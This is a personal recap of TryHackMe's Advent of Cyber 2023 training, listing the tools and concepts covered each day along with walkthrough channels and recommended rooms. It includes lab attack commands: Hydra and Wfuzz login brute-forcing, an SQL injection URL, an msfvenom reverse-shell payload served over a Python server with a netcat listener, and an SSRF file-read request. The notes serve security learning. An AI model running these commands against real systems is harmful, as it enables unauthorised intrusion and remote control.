# Advent of Code (AoC) 2023 Notes

This is a list of the tools and utilities from TryHackMe's Advent of Cyber 2023. This serves as a high level recap of the tools and concepts and vulnerabilities used as well as which tools were used together. 

I put this together in December but didn't get round to sharing it. I put this together to help remind me of what we covered and how different tools of trade fit together. Sharing it incase it is helpful to anyone. This is not walkthrough, this may be helpful as a reminder of AoC2023 if you have **already** done AoC 2023.
### Format
- Name of tool/s and or exploits.
- Key concept/s

At the end is a list of all the channels of the cybersecurity professionals who gave up their time and did walkthroughs. These are valuable channels with a lot you can learn, many of them specialize in a particular area of cybersecurity, such as Digital Forensics and Incident Response (DFRI).

Lastly, there is a list of the recommended rooms that were peppered throughout AoC2023.

For days where there were no tools I list the area of research / methodology

---
# Connecting Remotely
### OpenVPN
Install
`sudo apt install openvpn`

Syntax:
`sudo openvpn /path/to/file.ovpn`
### SSH
Install
`sudo apt install openssh-client`

Syntax:
`user@x.x.x.x` 

### RDP / VNC
Remmina (GUI)

Flatpak:
````
flatpak install flathub org.remmina.Remmina
````

## Day 1: Machine Learning
### Key concept
Natural Language Processing
Prompt injection

## Day 2: Log Analysis
Jupyter Notebooks
Python programming language
- Pandas
```
# Create a series
transportation_series = pd.Series(transportation)
```
- Matplotlib
```
# Creating a line plot
plt.plot(['January', 'February', 'March', 'April' ],[8,14,23,40])
```
### Key concept
Data Analysis

## Day 3:  Brute-forcing
Crunch
`crunch 3 3 0123456789ABCDEF -o 3digits.txt`

Hydra
`hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
### Key concept
Password complexity & brute force attacks

## Day 4: Brute-forcing
CeWL
Password list example:
`cewl -d 2 -m 5 -w passwords.txt http://MACHINE_IP --with-numbers`

Wfuzz
`wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://MACHINE_IP/login.php -d "username=FUZZ&password=FUZ2Z"`
### Key concept
Custom wordlist generation & brute-forcing

## Day 5: Reverse engineering
MS-DOS commands 
C systems programming language
File signatures / Magic Bytes
Online Converters Hex - ASCII
### Key concept
Legacy systems & reverse engineering

## Day 6: Memory corruption
Memory debuggers
Buffer overflows
### Key concept
Memory safety

## Day 7: Log Analysis
Apache web server logs
- Proxy servers
CLI commands:
- For file handling and text processing.
Linux Pipes
- Allows you to take the **output** of one command and use it as the input for another command
```
cut -d ' ' -f3 access.log | cut -d ':' -f1
```
### Key concept
Logging & malicious traffic

## Day 8: Disk forensics
FTK Imager
- verifying the integrity of a drive / image
- data recovery and forensic analysis
USB drop attack / baiting
### Key concept
Digital Forensics and Incident Response

## Day 9
### Malware Analysis
Sandboxing
dnsSpy ( .NET assembly (C#) debugger and editor)
Static analysis
- https://owasp.org/www-community/controls/Static_Code_Analysis
C# programming language
- .NET Compiled Binaries
C2 servers
Malware Execution Pipeline
### Key concept
Analyzing Malware Samples Safely

## Day 10: SQL injection
SQL - Structured Query Language
```
http://MACHINE_IP/giftresults.php?age='&interests=toys&budget=30
```
PHP - programming language
xp_cmdshell 
- system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server 

Remote Code Execution (RCE)
MSFvenom
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe`
Python server
`python3 -m http.server 8000`
Netcat listener
`nc -lnvp 4444`
### Key concept
SQL injection vulnerabilities
Beware of using `OR 1=1`

## Day 11: Active directory
Microsoft WHfB - authentication system
Powershell
PowerView
Whisker
Rubeus
Evil-WinRM
Windows Privilege escalation
### Key Concept: 
Compromising Active Directory 

## Day 12: Defence in depth
Web shells
Reverse Shell Scripts
Remove user
`sudo deluser tracy sud`
Remove a user from the sudo group
`sudo deluser tracy sudo`
Egrep (Grep + Regex)
`egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config`
### Key Concepts
Endpoint Hardening & Boot2Root methodology

## Day 13: Intrusion detection
Ufw - firewall
`sudo ufw status verbose`
PenTBox - honey pot
`./pentbox.rb`
### Key concepts
The Diamond Model of Intrusion Analysis

## Day 14: Machine Learning
Machine Learning algorithms and data structures
Python
- Numpy
### Key Concept
Machine Learning

## Day 15: Machine Learning
Jupyter Notebook
Python
- scikit-learn
### Key Concept
Machine Learning Pipeline

## Day 16: Machine Learning
Convolutional Neural Network
Docker
Tesseract OCR Optical Character Recognition)
captcha22
### Key Concept
Neural Networks & reCaptcha bypass

## Day 17: Traffic Analysis
Wireshark
SiLK ( System for Internet Level Knowledg)
### Key concept
- Network Artifacts / Statistics

## Day 18: Eradication
Linux Processes
- Top
- Crontab
- Systemctl
### Key Concepts:
- Persistence
- Linux processes

## Day 19:  Memory Forensics
Volatility
`-vol.py -h`
### Key Concept:
Digital Forensics & memory dumps

## Day 20: DevSecOps
GitLab
### Key Concept:
-  CI/CD (continuous integration and continuous delivery/continuous deployment & Indirect Poisoned Pipeline Execution.

## Day 21: DevSecOps
CI/CD (continuous integration and continuous delivery/continuous deployment 
- Jenkins
- Git
- Gitea
### Key Concept
- CI/CD (continuous integration and continuous delivery/continuous deployment & Indirect Poisoned Pipeline Execution.

## Day 22: SSRF ( server-side request forgery)

Types of SSRF
 - basic
 - Blind SSRF
 - Semi-Blind SSRF
HTTP Request
`http://MACHINE_IP/getClientData.php?url=file:////var/www/html/index.php`
### Key Concept
C2 Servers

## Day 23: Coerced Authentication
Ntlm Theft - A tool for generating multiple types of NTLMv2 hash theft files
Responder - LLMNR, NBT-NS and MDNS poisoner
John the Ripper
`john --wordlist=greedykeys.txt hash.txt`
### Key Concept
- Compromising Active Directory

## Day 24:  Mobile analysis
Digital Forensics
- Android Debug Bridge 
- Autospy
### Key Concept:
- Digital Forensics

#### Featured Cybersecurity Professionals / Walkthroughs
John Hammond
https://www.youtube.com/@_JohnHammond

HuskyHacks
https://www.youtube.com/@huskyhacks

InfoSec Pat
https://www.youtube.com/@InfoSecPat

Tib3rius
https://www.youtube.com/@Tib3rius

Gerald Auger, PhD - Simply Cyber
https://www.youtube.com/@SimplyCyber

arebelsec
https://www.youtube.com/@arebelsec1406

InsiderPhD
https://www.youtube.com/@InsiderPhD

David Alves Web
https://www.youtube.com/@DavidAlvesWeb

Mel
https://www.youtube.com/@RealTryHackMe

CyberInsight
https://www.youtube.com/@CYBERINSIGHT

UnixGuy | Cyber Security
https://www.youtube.com/@UnixGuy

Cybrites
https://www.youtube.com/@Cybrites

Alh4zr3d
https://www.youtube.com/@alh4zr3d3

MalwareCube
https://www.youtube.com/@MalwareCube

MWR CyberSec
https://www.youtube.com/@mwrcybersec2192


#### Recommended rooms / modules
Day 2:
https://tryhackme.com/room/introtologanalysis

Day 3:
https://tryhackme.com/room/passwordattacks

Day 4:
https://tryhackme.com/room/webenumerationv2

Day 5:
https://tryhackme.com/room/x86assemblycrashcourse

Day 6:
https://tryhackme.com/room/bof1

Day 7:
https://tryhackme.com/module/log-analysis
https://tryhackme.com/path-action/soclevel2/join

Day 8:
https://tryhackme.com/room/caseb4dm755

Day 9: 
https://tryhackme.com/room/intromalwareanalysis

Day 10: 
https://tryhackme.com/room/lessonlearned
https://tryhackme.com/module/software-security

Day 11: 
https://tryhackme.com/module/hacking-active-directory

Day 12:
https://tryhackme.com/path-action/soclevel1/join

Day 13: 
https://tryhackme.com/room/diamondmodelrmuwwg42
https://tryhackme.com/room/networkdevicehardening

Day 15: 
https://tryhackme.com/module/phishing

Day 16: 
https://tryhackme.com/path-action/redteaming/join

Day 17: 
https://tryhackme.com/module/network-fundamentals
https://tryhackme.com/module/wireshark
https://tryhackme.com/module/network-security-and-traffic-analysis

Day 18: 
https://tryhackme.com/room/linuxforensics

Day 19: 
https://tryhackme.com/room/volatility

Day 20: 
https://tryhackme.com/room/sourcecodesecurity

